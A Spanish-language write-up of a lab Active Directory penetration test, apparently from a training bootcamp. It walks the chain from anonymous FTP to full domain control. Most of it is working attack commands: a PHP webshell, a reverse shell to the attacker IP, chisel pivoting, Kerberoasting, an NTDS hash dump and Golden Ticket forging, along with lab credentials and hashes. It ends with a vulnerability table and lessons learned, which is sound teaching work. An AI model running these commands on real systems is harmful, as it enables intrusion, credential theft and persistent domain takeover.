# THE THRONE — Active Directory Pentest Writeup

**Plataforma:** PwnLabs / Bootcamp The Bridge
**Tipo de prueba:** Black-box — entorno segmentado, 3 máquinas
**Dificultad:** Alta
**Fecha:** Julio 2026
**Metodología:** OWASP Testing Guide v4.2 · PTES · MITRE ATT&CK
**Riesgo global:** CRÍTICO — CVSS v3.1 máx. 10.0

---

## Entorno

| Máquina | IP | Stack |
|---------|----|-------|
| Linux User (punto de entrada) | `10.200.18.5` | ProFTPD · Apache 2.4.18 · OpenSSH 7.2p2 |
| Win Usr Reto AD (pivote) | `10.200.17.10` | Windows Server 2019 · SMB · WinRM |
| Win DC Reto AD (objetivo final) | `10.200.17.20` | Windows Server 2019 · Active Directory · Kerberos |
| Atacante (Kali) | `10.10.3.102` | — |

La red interna AD (`10.200.17.0/24`) no es alcanzable directamente desde Kali. El acceso requirió comprometer el host Linux y establecer un túnel de pivoting.

---

## Cadena de explotación

```
Recon (nmap/FTP/Gobuster)
  → FTP anónimo con escritura → subida de webshell PHP
    → RCE + shell reversa (www-data)
      → Post-explotación Linux (/.runme.sh)
        → Flag 1: hash shrek → crackeo hashcat → onion
        → Credenciales de dominio en texto claro: EXAMPLE\testing:2021!Query
          → Pivoting (chisel SOCKS reverso + proxychains)
            → Enumeración AD (netexec SMB/LDAP)
              → Kerberoasting → iis_service (Domain Admin) → hashcat → LaRosalia2021
                → Flag 2: iis_service : LaRosalia2021
                → Volcado NTDS completo (--ntds) → hash krbtgt
                  → Flag 3: hermanos .doe (john.doe / jane.doe)
                  → Golden Ticket (impacket-ticketer)
                    → Domain Admin sin contraseña (acceso total y persistente)
```

---

## FASE OFENSIVA

### 1. Reconocimiento — Nmap

```bash
# Primera dirección (filtrada por firewall perimetral)
sudo nmap -Pn -p 21,22,80,161 10.200.17.5
# → todos filtered

# Dirección interna alternativa
sudo nmap -Pn -T4 --top-ports 100 10.200.18.5
# → 21/tcp open ftp | 22/tcp open ssh | 80/tcp open http

# Detección de versiones
sudo nmap -sV -p 21,22,80 10.200.18.5
# → ProFTPD | OpenSSH 7.2p2 Ubuntu | Apache httpd 2.4.18 (Ubuntu)
```

SNMP UDP 161 detectado en `10.200.17.5` (open|filtered). Puerto 80 en `10.200.17.5` en timeout — requiere la dirección interna `10.200.18.5`.

---

### 2. Enumeración FTP y web

```bash
# Descarga recursiva FTP anónimo
wget -r ftp://anonymous:anonymous@10.200.18.5/
# → CALL.html (109 bytes): título "onion", contenido "GET READY TO RECEIVE A CALL"

# Fuzzing web — pista en código fuente HTML: "Do you like gobuster? dirb? etc..."
gobuster dir -u http://10.200.18.5 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
# → /files (301) — coincide con directorio FTP con escritura
```

---

### 3. Acceso inicial — FTP anónimo + Webshell PHP

```bash
# Crear webshell mínima
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Subir vía FTP anónimo al directorio /files (servido por Apache)
ftp 10.200.18.5
> put shell.php
# → Transfer complete

# Listener en Kali
nc -lvnp 4444

# Disparar reverse shell desde webshell
curl --get "http://10.200.18.5/files/shell.php" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.3.102/4444 0>&1"'
```

Shell reversa recibida como `www-data`. Estabilización con python3 pty + stty raw.

**CVSS v3.1: 9.8 + 10.0 — Crítica** (CWE-284, CWE-78)

---

### 4. Post-explotación Linux — Flag 1

```bash
# Localizar script con credenciales
cat /.runme.sh
# → hash MD5 de shrek: cf4c2232354952690368f1b3dfdfb24d
# → credenciales de dominio en texto claro: EXAMPLE\testing:2021!Query

# Crackeo offline con hashcat
hashcat -m 0 shrek_hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule
```

**FLAG 1:** `onion` (contraseña del usuario shrek)

El título `<title>onion</title>` en CALL.html durante el reconocimiento era la pista directa.

**CVSS v3.1: 7.5 — Alta** (CWE-798)

---

### 5. Pivoting — chisel + proxychains hacia la red interna AD

La red `10.200.17.0/24` es inaccesible desde Kali. El host Linux comprometido sí tiene conectividad hacia ella.

```bash
# En Kali: servidor chisel + servidor HTTP para servir el binario
chisel server -p 8000 --reverse
python3 -m http.server 8080

# En host Linux comprometido: descargar y conectar cliente chisel
wget http://10.10.3.102:8080/chisel_static -O /tmp/chisel
chmod +x /tmp/chisel
./chisel client 10.10.3.102:8000 R:socks
# → proxy SOCKS5 abierto en 127.0.0.1:1080

# En Kali: configurar proxychains
# /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Escanear red interna a través del túnel
proxychains4 nmap -sT -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 10.200.17.20
# → DC (Windows Server 2019): Kerberos 88, LDAP 389/636, SMB 445, WinRM 5985, RDP 3389

proxychains4 nmap -sT -Pn -p 135,139,445,3389,5985 10.200.17.10
# → WINDOWS: SMB 445, WinRM 5985
```

---

### 6. Enumeración del Active Directory

```bash
# Validar credenciales de dominio contra el DC
proxychains4 netexec smb 10.200.17.20 -u testing -p '2021!Query'
# → [+] example.com\testing:2021!Query

# Enumerar usuarios del dominio
proxychains4 netexec smb 10.200.17.20 -u testing -p '2021!Query' --users
# → 10 usuarios: Administrator, Guest, krbtgt, cloudbase-init,
#    jane.doe, john.doe, mssql, iis_service, pruebas, testing
```

---

### 7. Kerberoasting — Flag 2

```bash
# Solicitar TGS para cuentas con SPN y volcar hashes
proxychains4 netexec ldap 10.200.17.20 \
  -u testing -p '2021!Query' \
  --kdcHost 10.200.17.20 \
  --kerberoasting kerberoast_output.txt
# → TGS obtenido para iis_service y mssql

# Crackeo offline con diccionario del laboratorio
hashcat -m 13100 kerberoast_output.txt /home/abalin/Descargas/diccionario.txt
```

**FLAG 2:** `iis_service : LaRosalia2021`

> ⚠️ Hallazgo crítico: `iis_service` pertenece al grupo **Domain Admins**. El Kerberoasting es completamente offline y no genera eventos de autenticación fallida detectables en tiempo real (CVSS 8.8 · CWE-521).

---

### 8. Post-explotación AD — Volcado de NTDS

```bash
# Confirmar privilegios de Domain Admin
proxychains4 netexec smb 10.200.17.20 -u iis_service -p 'LaRosalia2021'
# → [+] example.com\iis_service:LaRosalia2021 (Pwn3d!)

# Volcar toda la base de datos NTDS (hashes de todos los usuarios del dominio)
proxychains4 netexec smb 10.200.17.20 \
  -u iis_service -p 'LaRosalia2021' --ntds
# → 13 hashes NTLM volcados, incluyendo krbtgt:
#    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:610338dfc1b22a567b8f4377b031b13b:::

# Shell administrativa vía WMI
proxychains4 impacket-wmiexec \
  'example.com/iis_service:LaRosalia2021@10.200.17.20'
```

**FLAG 3:** `john.doe` y `jane.doe` (los «hermanos .doe», identificados durante el volcado de NTDS)

**CVSS v3.1: 10.0 — Crítica** (CWE-522)

---

### 9. Escalada final — Golden Ticket y Domain Admin

Con el hash NTLM de `krbtgt` y el SID del dominio, se forjó un Golden Ticket que otorga acceso administrativo total y **persistente** al dominio, independientemente de cualquier rotación de contraseñas de usuario.

```bash
# Forjar Golden Ticket con impacket-ticketer
proxychains4 impacket-ticketer \
  -nthash 610338dfc1b22a567b8f4377b031b13b \
  -domain-sid S-1-5-21-805668554-778713891-2534483124 \
  -domain example.com Administrator
# → Ticket guardado en Administrator.ccache

# Exportar ticket como caché de credenciales Kerberos
export KRB5CCNAME=Administrator.ccache

# Acceso al DC autenticándose vía Kerberos, sin contraseña
proxychains4 impacket-wmiexec -k -no-pass \
  -dc-ip 10.200.17.20 \
  example.com/Administrator@DC.example.com

# Verificación
C:\> whoami
example.com\administrator
C:\> hostname
dc
```

**Control total del dominio `example.com` obtenido como Administrator, sin contraseña.**

---

## Resumen de flags

| Flag | Objetivo | Resultado |
|------|----------|-----------|
| Flag 1 | Contraseña usuario shrek (Linux) | `onion` (hash MD5 crackeado con hashcat + rockyou) |
| Flag 2 | Contraseña servicio vulnerable AD | `iis_service : LaRosalia2021` (Kerberoasting + diccionario lab) |
| Flag 3 | Identidad «hermanos .doe» | `john.doe` y `jane.doe` (dominio example.com) |

---

## Vulnerabilidades identificadas

| Segmento | Hallazgo | Criticidad | CVSS | CWE | OWASP |
|----------|----------|-----------|------|-----|-------|
| Linux | FTP anónimo con escritura arbitraria | Crítica | 9.8 | CWE-284 | A05:2021 |
| Linux | RCE vía webshell PHP | Crítica | 10.0 | CWE-78 | A03:2021 |
| Linux | Credenciales de dominio en texto claro (script local) | Alta | 7.5 | CWE-798 | A07:2021 |
| Linux | SNMP expuesto sin autenticación robusta | Media | 5.3 | CWE-200 | A05:2021 |
| AD | Cuenta kerberoasteable con contraseña débil (iis_service) | Alta | 8.8 | CWE-521 | A07:2021 |
| AD | Cuenta de servicio con privilegio Domain Admin innecesario | Alta | 8.1 | CWE-269 | A01:2021 |
| AD | Exposición hash krbtgt vía volcado NTDS (Golden Ticket) | Crítica | 10.0 | CWE-522 | A02:2021 |
| Red | Ausencia de segmentación efectiva DMZ → red interna AD | Media | 6.5 | CWE-284 | A05:2021 |

---

## Herramientas utilizadas

`nmap` · `gobuster` · `curl` · `netcat` · `hashcat` · `chisel` · `proxychains4` · `netexec` · `evil-winrm` · `impacket-wmiexec` · `impacket-ticketer`

---

## Lecciones aprendidas

- Un host Linux perimetral "de apariencia poco crítica" con FTP anónimo de escritura puede ser la puerta de entrada a un dominio corporativo completo. La superficie de ataque no siempre está donde parece.
- El Kerberoasting es especialmente peligroso porque es completamente offline: no genera eventos de autenticación fallida ni alertas en tiempo real. Una cuenta de servicio con SPN + contraseña débil + privilegios de Domain Admin es una combinación fatal.
- Un Golden Ticket sobrevive a la rotación de contraseñas de cualquier usuario. El único mecanismo de invalidación es la doble rotación del hash de `krbtgt`. Esto convierte el compromiso del hash de krbtgt en persistencia indefinida.
- El pivoting con chisel + proxychains permite alcanzar segmentos de red aparentemente aislados utilizando únicamente el host comprometido como relay, sin necesitar acceso físico ni credenciales adicionales.
- La cadena de ataque completa (FTP anónimo → webshell → credenciales en texto claro → pivoting → Kerberoasting → NTDS → Golden Ticket) está construida íntegramente sobre errores de configuración, no sobre vulnerabilidades de software sin parche. Todos son prevenibles.
